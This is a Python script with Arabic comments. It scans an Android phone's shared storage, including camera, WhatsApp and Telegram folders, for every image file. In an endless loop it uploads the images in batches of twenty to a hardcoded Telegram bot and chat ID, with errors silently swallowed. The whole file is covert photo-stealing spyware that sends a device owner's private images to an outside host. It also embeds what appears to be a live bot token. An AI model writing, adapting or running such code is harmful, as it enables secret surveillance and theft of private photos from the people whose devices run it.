import os
import time
import requests

# معلومات البوت الخاصة بك
BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

# تخزين الملفات المرسلة لعدم التكرار
sent_files = set()

def send_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except: pass

def send_doc(path):
    try:
        with open(path, "rb") as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            # إرسال كـ Document لضمان وصول الصور بجودتها وبكل أنواعها
            r = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except: return False

def deep_scan():
    base_path = "/storage/emulated/0/"
    all_photos = []
    
    # البحث العميق في كل المجلدات (الصور، الواتساب، التيليجرام، الكاميرا)
    for root, dirs, files in os.walk(base_path):
        # تخطي ملفات النظام الثقيلة لسرعة البحث
        if "Android" in root:
            continue
            
        for file in files:
            if file.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
                full_path = os.path.join(root, file)
                if full_path not in sent_files:
                    all_photos.append(full_path)
    
    # ترتيب الصور: الأحدث أولاً (ويمكنك عكسها إذا أردت القديم أولاً)
    all_photos.sort(key=os.path.getmtime, reverse=True)
    return all_photos

def main():
    time.sleep(5)
    send_msg("🚀 بدء نظام الفحص الشامل (20 صورة/دورة)")
    
    while True:
        try:
            photos_to_send = deep_scan()
            
            if not photos_to_send:
                time.sleep(30) # إذا لم يجد صور جديدة ينتظر قليلاً
                continue

            count = 0
            for path in photos_to_send:
                if count >= 20: # التوقف بعد إرسال 20 صورة
                    break
                
                if send_doc(path):
                    sent_files.add(path)
                    count += 1
                    time.sleep(0.5) # فاصل زمني بسيط جداً بين صورة وأخرى

            # الانتظار 10 ثوانٍ قبل الدفعة التالية كما طلبت
            time.sleep(10)
            
        except Exception as e:
            time.sleep(10)

if __name__ == "__main__":
    main()
